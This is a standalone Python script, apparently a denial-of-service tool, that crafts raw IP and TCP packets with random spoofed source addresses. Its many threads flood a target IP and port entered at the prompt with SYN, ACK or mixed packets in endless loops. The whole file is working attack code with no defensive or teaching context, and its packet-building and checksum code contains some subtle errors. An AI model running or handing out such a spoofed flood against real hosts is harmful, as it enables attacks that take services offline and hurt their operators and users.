#!/usr/bin/python
# -*-coding:utf-8-*-

import socket
import struct
import random
import threading


class myThread(threading.Thread):
    def __init__(self, dstip, dstport, mode):
        threading.Thread.__init__(self)
        self.dstip = dstip
        self.dstport = dstport
        self.mode = mode

    def run(self):
        attack(self.dstip, self.dstport, self.mode)


def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += data[i] + (data[i + 1]<< 8)
    if n:
        s += data[i + 1]
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s


def IP(source, destination, udplen):
    version = 4
    ihl = 5
    tos = 0
    tl = 20 + udplen
    ip_id = random.randint(1, 65535)
    flags = 0
    offset = 0
    ttl = 128
    protocol = 6
    check = 0
    source = socket.inet_aton(source)
    destination = socket.inet_aton(destination)

    ver_ihl = (version << 4) + ihl
    flags_offset = (flags << 13) + offset
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            ver_ihl,
                            tos,
                            tl,
                            ip_id,
                            flags_offset,
                            ttl,
                            protocol,
                            check,
                            source,
                            destination)
    check = checksum(ip_header)
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            ver_ihl,
                            tos,
                            tl,
                            ip_id,
                            flags_offset,
                            ttl,
                            protocol,
                            socket.htons(check),
                            source,
                            destination)
    return ip_header


def TCP(srcip, dstip, protocol, dp, fg):
    source = socket.inet_aton(srcip)
    destination = socket.inet_aton(dstip)
    srcport = random.randint(1, 65535)
    dstport = dp
    syn_num = random.randint(1, 4000000000)
    if fg == 2:
        ack_num = 0
    else:
        ack_num = random.randint(1, 4000000000)
    hlen = 5
    zero = 0
    flag = fg
    window = 8192
    check = 0
    point = 0
    tcplen = hlen
    h_f = (hlen << 12) + flag
    TCP_head = struct.pack("!4s4sHHHHIIHHHH", source, destination, protocol, tcplen, srcport, dstport, syn_num, ack_num,
                           h_f, window, check, point)
    check = checksum(TCP_head)
    TCP_head = struct.pack("!HHIIHHHH", srcport, dstport, syn_num, ack_num, h_f, window, check, point)
    return TCP_head


def makepacket(dstip, dstport, fg):
    srcip = str(random.choice(ip_first)) + '.' + str(random.randint(1, 255)) + '.' + str(
        random.randint(1, 255)) + '.' + str(random.randint(1, 255))
    protocol = 6
    ippacket = IP(srcip, dstip, 5) + TCP(srcip, dstip, protocol, dstport, fg)
    return ippacket


def attack(dstip, dstport, mode):
    if mode == 'syn':
        fg = 2
        while 1:
            data = makepacket(dstip, dstport, fg)
            s.sendto(data, (dstip, dstport))
    elif mode == 'ack':
        fg = 18
        while 1:
            data = makepacket(dstip, dstport, fg)
            s.sendto(data, (dstip, dstport))
    elif mode == 'syn&ack':
        while 1:
            data = makepacket(dstip, dstport, 2)
            s.sendto(data, (dstip, dstport))
            data = makepacket(dstip, dstport, 18)
            s.sendto(data, (dstip, dstport))
    else:
        print('DON\'T xia say!')


dstip = input('attack IP:')
dstport = int(input('attack PORT:'))
mode = input('mode:(syn or ack or syn&ack)')
threads = int(input("线程数threads："))

ip_first = []
for i in range(1, 10):
    ip_first.append(i)

for i in range(11, 172):
    ip_first.append(i)

for i in range(173, 192):
    ip_first.append(i)

for i in range(193, 224):
    ip_first.append(i)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 6)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

threads_name = []
for i in range(threads):
    threads_name.append('teread' + str(i))

for i in range(threads):
    threads_name[i] = myThread(dstip, dstport, mode)

for i in range(threads):
    threads_name[i].start()
